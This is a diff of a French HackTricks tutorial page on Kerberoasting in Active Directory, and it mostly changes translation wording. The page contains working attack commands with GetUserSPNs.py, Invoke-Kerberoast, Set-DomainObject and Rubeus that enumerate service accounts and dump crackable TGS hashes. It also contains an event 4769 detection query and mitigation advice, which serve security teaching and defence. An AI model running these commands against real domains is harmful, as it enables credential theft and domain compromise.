@@ -1,6 +1,6 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
@@ -10,7 +10,7 @@ Accédez dès aujourd'hui :
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Autres façons de soutenir HackTricks :
 
@@ -24,22 +24,22 @@ Autres façons de soutenir HackTricks :
 
 ## Kerberoast
 
-Le Kerberoasting se concentre sur l'acquisition de **tickets TGS**, en particulier ceux liés aux services fonctionnant sous des **comptes utilisateur** dans **Active Directory (AD)**, à l'exclusion des **comptes d'ordinateur**. Le chiffrement de ces tickets utilise des clés provenant des **mots de passe des utilisateurs**, permettant la possibilité de **craquage des informations d'identification hors ligne**. L'utilisation d'un compte utilisateur en tant que service est indiquée par une propriété **"ServicePrincipalName"** non vide.
+Le Kerberoasting se concentre sur l'acquisition de **tickets TGS**, en particulier ceux liés aux services fonctionnant sous des **comptes utilisateur** dans **Active Directory (AD)**, à l'exclusion des **comptes d'ordinateur**. Le chiffrement de ces tickets utilise des clés provenant des **mots de passe des utilisateurs**, permettant la possibilité de **cassage de crédentials hors ligne**. L'utilisation d'un compte utilisateur en tant que service est indiquée par une propriété **"ServicePrincipalName"** non vide.
 
 Pour exécuter le **Kerberoasting**, un compte de domaine capable de demander des **tickets TGS** est essentiel ; cependant, ce processus ne nécessite pas de **privilèges spéciaux**, le rendant accessible à toute personne disposant de **justes identifiants de domaine**.
 
 ### Points clés :
 
-* Le **Kerberoasting** cible les **tickets TGS** des **services de compte utilisateur** dans **AD**.
-* Les tickets chiffrés avec des clés provenant des **mots de passe des utilisateurs** peuvent être **craqués hors ligne**.
+* Le **Kerberoasting** cible les **tickets TGS** pour les **services de compte utilisateur** dans **AD**.
+* Les tickets chiffrés avec des clés provenant des **mots de passe des utilisateurs** peuvent être **cassés hors ligne**.
 * Un service est identifié par un **ServicePrincipalName** qui n'est pas nul.
 * Aucun **privilège spécial** n'est nécessaire, juste des **identifiants de domaine valides**.
 
 ### **Attaque**
 
 {% hint style="warning" %}
-Les **outils de Kerberoasting** demandent généralement un chiffrement **`RC4`** lors de l'attaque et de l'initiation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
-Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que les AES-256 (type 18) commencent par **`$krb5tgs$18$*`**.
+Les **outils de Kerberoasting** demandent généralement un chiffrement **`RC4`** lors de l'attaque et de l'initiation des requêtes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à casser hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
+Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que ceux de AES-256 (type 18) commencent par **`$krb5tgs$18$*`**.
 {% endhint %}
 
 #### **Linux**
@@ -53,14 +53,14 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Outils multi-fonctionnalités incluant un dump des utilisateurs pouvant être kerberoastés :
+Outils multi-fonctionnalités comprenant un dump des utilisateurs pouvant être kerberoastés :
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
 #### Windows
 
-* **Énumérer les utilisateurs pouvant être victimes de l'attaque Kerberoast**
+* **Énumérer les utilisateurs Kerberoastable**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
@@ -107,10 +107,10 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service Kerberos a été demandé` est généré.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser facilement** des workflows alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -127,22 +127,22 @@ Si vous avez **suffisamment de permissions** sur un utilisateur, vous pouvez le 
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici : [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Si vous rencontrez cette **erreur** depuis Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, c'est à cause de l'heure locale, vous devez synchroniser l'hôte avec le contrôleur de domaine. Voici quelques options:
+Si vous rencontrez cette **erreur** depuis Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** c'est à cause de l'heure locale, vous devez synchroniser l'hôte avec le contrôleur de domaine. Voici quelques options :
 
-* `ntpdate <IP du DC>` - Obsolète à partir d'Ubuntu 16.04
+* `ntpdate <IP du DC>` - Obsolète depuis Ubuntu 16.04
 * `rdate -n <IP du DC>`
 
 ### Atténuation
 
-Le Kerberoasting peut être effectué avec un haut degré de discrétion s'il est exploitable. Pour détecter cette activité, il convient de prêter attention à l'**ID d'événement de sécurité 4769**, qui indique qu'un ticket Kerberos a été demandé. Cependant, en raison de la fréquence élevée de cet événement, des filtres spécifiques doivent être appliqués pour isoler les activités suspectes:
+Le Kerberoasting peut être effectué avec un haut degré de discrétion s'il est exploitable. Pour détecter cette activité, il convient de prêter attention à l'**ID d'événement de sécurité 4769**, qui indique qu'un ticket Kerberos a été demandé. Cependant, en raison de la fréquence élevée de cet événement, des filtres spécifiques doivent être appliqués pour isoler les activités suspectes :
 
 * Le nom du service ne doit pas être **krbtgt**, car il s'agit d'une demande normale.
 * Les noms de service se terminant par **$** doivent être exclus pour éviter d'inclure les comptes machine utilisés pour les services.
 * Les demandes provenant des machines doivent être filtrées en excluant les noms de compte formatés comme **machine@domain**.
 * Seules les demandes de ticket réussies doivent être prises en compte, identifiées par un code d'erreur de **'0x0'**.
-* **Le plus important**, le type de chiffrement du ticket doit être **0x17**, ce qui est souvent utilisé dans les attaques de Kerberoasting.
+* **Surtout**, le type de chiffrement du ticket doit être **0x17**, ce qui est souvent utilisé dans les attaques de Kerberoasting.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
@@ -155,7 +155,7 @@ En mettant en œuvre ces mesures, les organisations peuvent réduire significati
 
 ## Kerberoast sans compte de domaine
 
-En **septembre 2022**, une nouvelle méthode pour exploiter un système a été révélée par un chercheur nommé Charlie Clark, partagée via sa plateforme [exploit.ph](https://exploit.ph/). Cette méthode permet l'acquisition de **Tickets de Service (ST)** via une requête **KRB\_AS\_REQ**, qui ne nécessite pas le contrôle d'un compte Active Directory. Essentiellement, si un principal est configuré de manière à ne pas nécessiter de pré-authentification - un scénario similaire à ce qui est connu dans le domaine de la cybersécurité comme une attaque **AS-REP Roasting** - cette caractéristique peut être exploitée pour manipuler le processus de requête. Plus précisément, en modifiant l'attribut **sname** dans le corps de la requête, le système est trompé pour émettre un **ST** au lieu du Ticket Granting Ticket (TGT) chiffré standard.
+En **septembre 2022**, une nouvelle méthode d'exploitation d'un système a été révélée par un chercheur nommé Charlie Clark, partagée via sa plateforme [exploit.ph](https://exploit.ph/). Cette méthode permet l'acquisition de **Tickets de Service (ST)** via une requête **KRB\_AS\_REQ**, qui ne nécessite pas le contrôle d'un compte Active Directory. Fondamentalement, si un principal est configuré de manière à ne pas nécessiter de pré-authentification - un scénario similaire à ce qui est connu dans le domaine de la cybersécurité comme une attaque **AS-REP Roasting** - cette caractéristique peut être exploitée pour manipuler le processus de requête. Plus précisément, en modifiant l'attribut **sname** dans le corps de la requête, le système est trompé pour émettre un **ST** au lieu du Ticket Granting Ticket (TGT) chiffré standard.
 
 La technique est entièrement expliquée dans cet article : [article de blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -183,19 +183,19 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
